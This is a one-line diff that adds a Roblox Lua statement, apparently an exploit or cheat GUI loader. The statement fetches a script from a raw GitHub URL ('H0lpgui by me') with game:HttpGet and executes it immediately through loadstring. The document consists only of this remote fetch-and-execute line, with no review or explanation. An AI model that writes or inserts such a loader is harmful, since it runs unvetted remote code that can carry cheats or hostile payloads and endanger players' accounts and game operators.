@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/H0lpgui/main/H0lpgui%20by%20me"))()
